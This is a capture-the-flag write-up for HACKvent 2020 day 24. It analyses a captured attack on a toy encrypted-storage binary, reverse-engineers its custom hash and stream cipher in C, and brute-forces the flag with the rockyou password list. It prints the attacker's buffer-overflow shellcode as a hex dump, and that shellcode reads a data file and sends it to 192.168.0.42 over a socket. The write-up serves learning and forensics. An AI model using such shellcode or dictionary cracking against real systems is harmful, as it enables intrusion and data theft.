[← Day 23](../day23/) / [↑ TOC](../README.md)


# Day 24 / HV20.24 Santa's Secure Data Storage



## Challenge

<!-- ...10....:...20....:...30....:...40....:...50....:...60....:...70....:. -->
* Author: scryh ([@scryh\_](https://twitter.com/scryh_),
                 <https://devel0pment.de/>)
* Tags:   #crypto  #network-security #exploitation #reverse-engineering
* Level:  leet

In order to prevent the leakage of any flags, Santa decided to instruct his
elves to implement a secure data storage, which encrypts all entered data before
storing it to disk.

According to the paradigm _Always implement_ your own crypto the elves designed
a custom hash function for storing user passwords as well as a custom stream
cipher, which is used to encrypt the stored data.

Santa is very pleased with the work of the elves and stores a flag in the
application. For his password he usually uses the _secure password generator_
`shuf -n1 rockyou.txt`.

Giving each other a pat on the back for the good work the elves lean back in
their chairs relaxedly, when suddenly the intrusion detection system raises an
alert: the application seems to be exploited remotely!


### Mission

Santa and the elves need your help!

The intrusion detection system captured the network traffic of the whole
attack.

How did the attacker got in? Was (s)he able to steal the flag?

[Download](Download.zip)


### Notes

This challenge will give full points for 72h (until `2020-12-26T23:59:59+01:00`)
so you don't have to explain to your siblings that HACKvent is more important
than certain other things.



## Solution


### What's in the box

The downloadable zip archive contained a few files:

```sh
$ unzip -d Download Download.zip 
Archive:  Download.zip
 extracting: Download/server.sh       
  inflating: Download/data_storage    
   creating: Download/data/
  inflating: Download/attack.pcapng
```

The file `data_storage` is an Linux executable. It's the main part of santa's 
_secure data storage_ application. It uses standard input and output for
communication.

```sh
$ file Download/data_storage
Download/data_storage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, BuildID[sha1]=4f732bdcc708dd6885deaf71d1971f8e81cc4f55, for GNU/Linux 3.2.0, not stripped
```

The purpose of the short shell script – `server.sh` – is to turn the main
program into a network attached server application. It's not essential for
solving the challenge. The folder `data` is empty in the beginning. The main
program stores various files in the folder during its operation.

The last file – `attack.pcapng` – is a network traffic recording of the attack
mentioned in the challenge description.


### How the app works

When calling `data_storage` it asks for a user name and a password. If the 
user name exists, it wants the user to authenticate. Otherwise a new user is
created which results in the file `data/<username>_pwd.txt` with seemingly
binary data as contents. The binary contents always have the same number of
bytes no matter the user name or password. It then asks the user to
choose an action.

```sh
$ ls data

$ ./data_storage 
welcome to santa's secure data storage!
please login with existing credentials or enter new username ...
username> leeloo 
creating user 'leeloo' ...
please set your password (max-length: 19)
password> multipass
welcome leeloo!
[0] show data
[1] enter data
[2] delete data
[3] quit
choice> 3
good bye!

$ ls data
leeloo_pwd.txt

$ xxd data/leeloo_pwd.txt 
00000000: 18c8 89d2 8ea7 617a 8dd4 bf38 1755 18d3  ......az...8.U..
```

If the user chooses to enter data, the program creates a new (or overwrites and
existing) file `data/<username>_data.txt`. This data file contains binary data
with the same amount of bytes as the input (assuming the terminating `\x00` byte
of C strings is included in the cipher text).

```sh
$ ./data_storage 
welcome to santa's secure data storage!
please login with existing credentials or enter new username ...
username> leeloo
found user 'leeloo' ...
password> multipass
welcome leeloo!
[0] show data
[1] enter data
[2] delete data
[3] quit
choice> 1
data> corben dallas
[0] show data
[1] enter data
[2] delete data
[3] quit
choice> 3
good bye!

$ ls data
leeloo_data.txt  leeloo_pwd.txt

$ xxd data/leeloo_data.txt 
00000000: bb78 af6d 519a 11a7 490f 7466 874a       .x.mQ...I.tf.J
```

### What happened during the attack

The attacker started to communicate with the server in a normal fashion. He 
logged in as user _evil0r_ with the password _lovebug1_. Upon being presented
the application menu, the attacker sent the following packet contents as his
attack:

```sh
$ xxd attack_payload.bin 
00000000: 3320 4141 4141 4141 4141 4141 4141 4141  3 AAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 4141 1041 4000 0000 0000 6874 7874 0048  AA.A@.....htxt.H
00000050: bf74 615f 6461 7461 2e57 48bf 6461 7461  .ta_data.WH.data
00000060: 2f73 616e 5748 89e7 4831 f648 31d2 b802  /sanWH..H1.H1...
00000070: 0000 000f 0548 89c7 48ba 0000 0100 0100  .....H..H.......
00000080: 0000 526a 006a 006a 006a 0048 89e6 48ba  ..Rj.j.j.j.H..H.
00000090: 0100 0000 0000 0020 5248 ba00 0000 1337  ....... RH.....7
000000a0: 0100 0052 ba20 0000 00b8 0000 0000 0f05  ...R. ..........
000000b0: 4831 c981 340e efbe adde 4883 c104 4883  H1..4.....H...H.
000000c0: f920 75ef bf02 0000 00be 0200 0000 4831  . u...........H1
000000d0: d2b8 2900 0000 0f05 4889 c748 89e6 4883  ..).....H..H..H.
000000e0: c603 ba32 0000 0041 ba00 0000 006a 0049  ...2...A.....j.I
000000f0: b802 0000 35c0 a800 2a41 5049 89e0 41b9  ....5...*API..A.
00000100: 1000 0000 b82c 0000 000f 05bf 0000 0000  .....,..........
00000110: b83c 0000 000f 050a                      .<......
```

This payload consists of the menu choice `3` which would terminate the
`data_storage` under normal circumstances. What follows looks like a buffer
overflow attack. The packet also contains fragments of the string 
`data/santa_data.txt` which is probably the path to the file containing the
encrypted flag (on the original server).

The response to this attack packet is firstly the message _good bye_  – as
expected from the terminating _data\_storage_ application. Secondly and
surprisingly the server sent a DNS query packet containing binary data which is
most likely the encrypted data from the `santa_data.txt` file.

```sh
$ xxd attack_response.bin 
00000000: 20e5 afe5 9d31 aca3 ca21 1ec3 79a6 7323   ....1...!..y.s#
00000010: 5eda b6a0 8d2e d3b7 b66b 5585 7ec8 3422  ^........kU.~.4"
00000020: 7a00 0001 0001                           z.....
```


### Taking a look inside

Ghidra was used for reverse engineering the binary files. Luckily the main
structure function names were available in the binary. There are functions
like `main`, `check_pwd`, `create_user`, `enter_data`, `delete_data`, etc. The
function names an their usage through out the program correspond perfectly with
the general usage experience when running the program.

The following functions were deemed interesting and were decompiled to C:

* `calc_hash`\
  This function looks like a custom hash function. The password a user provides
  is hashed by the program with this function and then stored into the
  corresponding `data/<username>_pwd.txt` file.

* `decrypt`\
  This function gathers the file contents of `data/<username>_data.txt`, the 
  hashed password and data from the function `keystream_get_char`. It then
  XORs the encrypted data from the file with the keystream data. The resulting
  data is printed to standard out by other parts of the program.

* `keystream_get_char`
  This is the most inaccessible function of all of them. Its decompilation was
  obviously incomplete or not entirely correct. It needed some guessing as to
  what actually happens in this function. It's safe to say that it is some kind
  of custom key stream generator that uses the user's password hash as basis.


### Drafting a strategy

At this point a general theory of what happend could be formed as well as a
strategy to obtain the flag:

1. Santa used the original program. He created a user with a password randomly
   chosen from the infamous [Rockyou data breach]() password list. The password's
   hash was calculated and stored.

2. Santa encrypted some data (the flag ;-). The keystream for this encryption
   stems somehow from password hash.

3. The attacker created an account and launched an attack to steal santa's 
   encrypted data.

The aim is to build a piece of software that goes through the Rockyou password
list, builds a hash for each password, uses the hash as keystream material and
keeps decrypting the captured data from the DNS-query packet until a familiar
pattern like `HV20{` emerges.

[Rockyou data breach]: https://en.wikipedia.org/wiki/RockYou#Data_breach


### Implementing the hash function

The hash function was quite easy to implement since the decompiled c code from
Ghidra could be used almost as is:

```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define IN_BUF_SIZE 20
#define OUT_BUF_SIZE 4

void calc_hash(char *src_buf,int len,uint32_t *sink_buf)
{
	uint32_t blk_a0, blk_b0;
	uint32_t blk_a1, blk_b1;
	uint32_t blk_a2, blk_b2;
	uint32_t blk_a3, blk_b3;

	uint32_t i;
	char     chr;
	
	blk_a0 = 0x68736168; blk_b0 = 0xc00ffeee;
	blk_a1 = 0xdeadbeef; blk_b1 = 0x68736168;
	blk_a2 = 0x65726f6d; blk_b2 = 0xdeadbeef;
	blk_a3 = 0xc00ffeee; blk_b3 = 0x65726f6d;

	i = 0;
	while (i < len) {
		chr = src_buf[i];
		blk_a1 = blk_b1 ^
		         ((uint32_t)chr *  i         & 0xffU ^ (uint32_t)chr |
		         ((uint32_t)chr * (i + 0x31) & 0xffU ^ (uint32_t)chr) << 0x18 |
		         ((uint32_t)chr * (i + 0x42) & 0xffU ^ (uint32_t)chr) << 0x10 |
		         ((uint32_t)chr * (i + 0xef) & 0xffU ^ (uint32_t)chr) << 8);
		blk_a2 = blk_b2 ^
		         ((uint32_t)chr *  i         & 0x5aU ^ (uint32_t)chr |
		         ((uint32_t)chr * (i + 0xc0) & 0xffU ^ (uint32_t)chr) << 0x18 |
		         ((uint32_t)chr * (i + 0x11) & 0xffU ^ (uint32_t)chr) << 0x10 |
		         ((uint32_t)chr * (i + 0xde) & 0xffU ^ (uint32_t)chr) << 8);
		blk_a3 = blk_b3 ^
		         ((uint32_t)chr *  i         & 0x22U ^ (uint32_t)chr |
		         ((uint32_t)chr * (i + 0xe3) & 0xffU ^ (uint32_t)chr) << 0x18 |
		         ((uint32_t)chr * (i + 0xde) & 0xffU ^ (uint32_t)chr) << 0x10 |
		         ((uint32_t)chr * (i + 0x0d) & 0xffU ^ (uint32_t)chr) << 8);
		blk_a0 = blk_b0 ^
		         ((uint32_t)chr *  i         & 0xefU ^ (uint32_t)chr |
		         ((uint32_t)chr * (i + 0x52) & 0xffU ^ (uint32_t)chr) << 0x18 |
		         ((uint32_t)chr * (i + 0x24) & 0xffU ^ (uint32_t)chr) << 0x10 |
		         ((uint32_t)chr * (i + 0x33) & 0xffU ^ (uint32_t)chr) << 8);
		i = i + 1;
		blk_b0 = blk_a0;
		blk_b3 = blk_a3;
		blk_b2 = blk_a2;
		blk_b1 = blk_a1;
	}

	sink_buf[0] = blk_a0;
	sink_buf[1] = blk_a1;
	sink_buf[2] = blk_a2;
	sink_buf[3] = blk_a3;

	return;
}


int main() {
	char     in_buf[IN_BUF_SIZE];
	uint32_t out_buf[OUT_BUF_SIZE];
	int      str_len = 0;

	fgets(in_buf, sizeof in_buf, stdin);
	for(int i=0; i < IN_BUF_SIZE; i++) {
		if(in_buf[i] == 0x00 || in_buf[i] == 0x0a) {
			str_len = i;
			break;
		}
	}

	calc_hash(in_buf, str_len, out_buf);

	fwrite(out_buf, 1, sizeof(out_buf), stdout);

	return 0;
}
```

Correctness was tested by comparing the hash produced by the newly implemented
function with the hash produced by the original program:

```sh
$ xxd data/leeloo_pwd.txt 
00000000: 18c8 89d2 8ea7 617a 8dd4 bf38 1755 18d3  ......az...8.U..

$ printf "multipass" | ./hash_calc | xxd
00000000: 18c8 89d2 8ea7 617a 8dd4 bf38 1755 18d3  ......az...8.U..
```


### Understanding the `keystream_get_char` function

While the hash function was easy peasy lemon squeezy, this little keystream
function was more like… difficult difficult lemon difficult. Combining reading
its assembly code, its decompiled C code with some guess work and a lot of trial
and error, it was finally possible to understand, implement and verify what it
does. The following decompiled C code…

```c
long keystream_get_char(uint param_1,long param_2)
{
  uint uVar1;
  undefined8 local_22;
  undefined2 local_1a;
  char local_9;
  
  local_22 = 0x563412c0efbeadde;
  local_1a = 0x9a78;
  uVar1 = (uint)((int)param_1 >> 0x1f) >> 0x1c;
  local_9 = *(char *)(param_2 + (int)((param_1 + uVar1 & 0xf) - uVar1));
  return (long)(int)((int)*(char *)((long)&local_22 + (ulong)(long)local_9 % 10) ^
                    (int)local_9 ^ param_1);
}
```

… could be translated to the following more readable code fragment …

```c
    unsigned char magic[10] = {0xde,0xad,0xbe,0xef,0xc0,0x12,0x34,0x56,0x78,0x9a};    
    unsigned char hash_byte;    
    unsigned char magic_byte;    
    unsigned char key_byte;    
     
    hash_byte  = ( hash_buf[(i % 16) / 4] >> (8 * (i % 4)) ) & 0xff;    
    magic_byte = magic[hash_byte % 10];    
    key_byte   = hash_byte ^ magic_byte ^ (unsigned char) i;    
```

Essentially, any keystream byte consists of three XOR'd parts:

1. The index number `i`,
2. the magic byte taken from `magic[i % 10]`, a 10 byte long buffer,
3. and the hash byte from the password hash `hash[i % 16]` (the complicated
   notation above just stems from the fact, that the hash buffer was implemented
   as an array of 32-bit wide integers).


### Integrating everyting into one decrypting über-binary

<!-- ...10....:...20....:...30....:...40....:...50....:...60....:...70....:. -->
All parts were combined into the following C program. It directly takes a list
of newline separated password strings from standard input and outputs decrypted
data. The encrypted input data has to be put inside the code as array buffer.

```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define IN_BUF_SIZE 20
#define OUT_BUF_SIZE 4

void calc_hash(char *src_buf,int len,uint32_t *sink_buf)
{
	uint32_t blk_a0, blk_b0;
	uint32_t blk_a1, blk_b1;
	uint32_t blk_a2, blk_b2;
	uint32_t blk_a3, blk_b3;
	
	uint32_t i;
	char     chr;
	
	blk_a0 = 0x68736168; blk_b0 = 0xc00ffeee;
	blk_a1 = 0xdeadbeef; blk_b1 = 0x68736168;
	blk_a2 = 0x65726f6d; blk_b2 = 0xdeadbeef;
	blk_a3 = 0xc00ffeee; blk_b3 = 0x65726f6d;

	i = 0;
	while (i < len) {
		chr = src_buf[i];
		blk_a1 = blk_b1 ^
		         ((uint32_t)chr *  i         & 0xffU ^ (uint32_t)chr |
		         ((uint32_t)chr * (i + 0x31) & 0xffU ^ (uint32_t)chr) << 0x18 |
		         ((uint32_t)chr * (i + 0x42) & 0xffU ^ (uint32_t)chr) << 0x10 |
		         ((uint32_t)chr * (i + 0xef) & 0xffU ^ (uint32_t)chr) << 8);
		blk_a2 = blk_b2 ^
		         ((uint32_t)chr *  i         & 0x5aU ^ (uint32_t)chr |
		         ((uint32_t)chr * (i + 0xc0) & 0xffU ^ (uint32_t)chr) << 0x18 |
		         ((uint32_t)chr * (i + 0x11) & 0xffU ^ (uint32_t)chr) << 0x10 |
		         ((uint32_t)chr * (i + 0xde) & 0xffU ^ (uint32_t)chr) << 8);
		blk_a3 = blk_b3 ^
		         ((uint32_t)chr *  i         & 0x22U ^ (uint32_t)chr |
		         ((uint32_t)chr * (i + 0xe3) & 0xffU ^ (uint32_t)chr) << 0x18 |
		         ((uint32_t)chr * (i + 0xde) & 0xffU ^ (uint32_t)chr) << 0x10 |
		         ((uint32_t)chr * (i + 0x0d) & 0xffU ^ (uint32_t)chr) << 8);
		blk_a0 = blk_b0 ^
		         ((uint32_t)chr *  i         & 0xefU ^ (uint32_t)chr |
		         ((uint32_t)chr * (i + 0x52) & 0xffU ^ (uint32_t)chr) << 0x18 |
		         ((uint32_t)chr * (i + 0x24) & 0xffU ^ (uint32_t)chr) << 0x10 |
		         ((uint32_t)chr * (i + 0x33) & 0xffU ^ (uint32_t)chr) << 8);
		i = i + 1;
		blk_b0 = blk_a0;
		blk_b3 = blk_a3;
		blk_b2 = blk_a2;
		blk_b1 = blk_a1;
	}

	sink_buf[0] = blk_a0;
	sink_buf[1] = blk_a1;
	sink_buf[2] = blk_a2;
	sink_buf[3] = blk_a3;
}


void decrypt(uint32_t *hash_buf) {
	unsigned char enc_data_buf[14] = {0xbb,0x78,0xaf,0x6d,0x51,0x9a,0x11,0xa7,0x49,0x0f,0x74,0x66,0x87,0x4a};
	unsigned char dec_data_buf[14] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
	int           data_len =   14;

	unsigned char magic[10] = {0xde,0xad,0xbe,0xef,0xc0,0x12,0x34,0x56,0x78,0x9a};
	unsigned char hash_byte;
	unsigned char magic_byte;
	unsigned char key_byte;

	for(int i=0; i < data_len; i++) {
		hash_byte = ( hash_buf[(i % 16) / 4] >> (8 * (i % 4)) ) & 0xff;
		//printf("%02x ", hash_byte);
		magic_byte = magic[hash_byte % 10];
		//printf("%02x ", magic_byte);
		key_byte = hash_byte ^ magic_byte ^ (unsigned char) i;
		//printf("%02x ", key_byte);

		dec_data_buf[i] = key_byte ^ enc_data_buf[i];
	}

	fwrite(dec_data_buf, 1, data_len, stdout);
	printf("\n");
}


int main() {
	char str_buf[IN_BUF_SIZE];
	uint32_t hash_buf[OUT_BUF_SIZE];
	char c;
	int  i = 0;

	while ((c = getchar()) != EOF) {
		if (c == 0x0a) {
			str_buf[i] = 0x00;
			calc_hash(str_buf, i, hash_buf);
//			printf("\nPassword:%s\n", str_buf);
			decrypt(hash_buf);
			i = 0;
		} else {
			if (i < IN_BUF_SIZE) {
				str_buf[i] = c;
				i++;
			}
		}
	}

	return 0;
}
```

For testing purposes the encrypted data produced by the original program was
put into the decryption implementation. The program was then fed with the
correct password and …

```sh
$ clang -o decrypt decrypt.c 

$ printf "multipass\n" | ./decrypt | xxd
00000000: 636f 7262 656e 2064 616c 6c61 7300 0a    corben dallas..
```

… Aw yiss! The decryption works.

Next the data from the captured DNS request packet was included into the
decryption program:

```c
…
unsigned char enc_data_buf[32] = {0xe5,0xaf,0xe5,0x9d,0x31,0xac,0xa3,0xca,0x21,0x1e,0xc3,0x79,0xa6,0x73,0x23,0x5e,0xda,0xb6,0xa0,0x8d,0x2e,0xd3,0xb7,0xb6,0x6b,0x55,0x85,0x7e,0xc8,0x34,0x22,0x00};
…
```

But no matter how the data was arranged, nothing meaningful could be found :-/
At least performance wise the program was very pleasing: in the order of 10
seconds to try all ~14 Mio. passwords in a VM on a recent i5 laptop without any
kind of parallelization.

```sh
$ time cat /usr/share/wordlists/rockyou.txt | ./decrypt | cat -v | grep -i 'HV20{'

real    0m9.958s
user    0m12.135s
sys     0m3.421s
```


### "There must be something up with this input data..."

After a frustrating phase of trial and so much error with no gain the next
possible move was to investigate the attack buffer overflow more. Thanks to
a hint from _mcia_ the attack payload was transfered to a file and loaded into
Ghidra (with the same language settings as the _data\_storage_ program).

The following decompiled C code could be found:

```c
/* WARNING: Control flow encountered bad instruction data */

void UndefinedFunction_00000064(void)

{
  long lVar1;
  undefined8 uStack48;
  undefined8 uStack40;
  undefined8 uStack32;
  undefined8 uStack24;
  
  syscall();
  uStack24 = 0;
  uStack32 = 0;
  uStack40 = 0;
  uStack48 = 0;
  syscall();
  lVar1 = 0;
  do {
    *(uint *)((long)&uStack48 + lVar1) = *(uint *)((long)&uStack48 + lVar1) ^ 0xdeadbeef;
    lVar1 = lVar1 + 4;
  } while (lVar1 != 0x20);
  syscall();
  syscall();
  syscall();
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}
```

There was a loop with 32 iterations (the same as the amount of bytes of
encrypted data) within which _some data_ was repeatedly XOR'd with the integer
`0xdeadbeef`. Then there were 3 system calls that turned out to be:

| %rax | Name   | Entry point | Implementation |
|------|--------|-------------|----------------|
| 0x29 | socket | sys_socket  | net/socket.c   |
| 0x2c | sendto	| sys_sendto  | net/socket.c   |
| 0x3c | exit   | sys_exit    | kernel/exit.c  |

The second syscall was accompanied by the value `0x2a00a8c035000002`. With a bit
of imagination you can see the target ip address and port number of the attack
response DNS request packet:

`0xc0` = `192`, `0xa8` = `168`, `0x00` = `0`, `0x2a` = `42` and `0x35` = `55`

=> IP _192.168.0.42_ with port _55_.

It was simply assumed that the _some data_ from above was the encrypted flag.
Naturally the XORing was reversed…

```python
>>> data=0xe5afe59d31aca3ca211ec379a673235edab6a08d2ed3b7b66b55857ec834227a
>>> dead=0xefbeaddeefbeaddeefbeaddeefbeaddeefbeaddeefbeaddeefbeaddeefbeadde
>>> hex(data ^ dead)
'0xa114843de120e14cea06ea749cd8e8035080d53c16d1a6884eb28a0278a8fa4'
```

… and the resulting data was implanted into the decryption program:

```c
…
unsigned char enc_data_buf[32] = {0x0a,0x11,0x48,0x43,0xde,0x12,0x0e,0x14,0xce,0xa0,0x6e,0xa7,0x49,0xcd,0x8e,0x80,0x35,0x08,0x0d,0x53,0xc1,0x6d,0x1a,0x68,0x84,0xeb,0x28,0xa0,0x27,0x8a,0x8f,0xa4};
…
```

The whole shebang was run against the password list again and …

```sh
# time cat /usr/share/wordlists/rockyou.txt | ./decrypt | cat -v | grep -i 'HV20{'
HV20{0h_n0es_fl4g_g0t_l34k3d!1}^@

real    0m9.978s
user    0m11.097s
sys     0m4.645s
```
… GREAT SUCCESS ! `\(^-^)/`

<!-- ...10....:...20....:...30....:...40....:...50....:...60....:...70....:. -->
--------------------------------------------------------------------------------

Flag: `HV20{0h_n0es_fl4g_g0t_l34k3d!1}`

[← Day 23](../day23/) / [↑ TOC](../README.md)
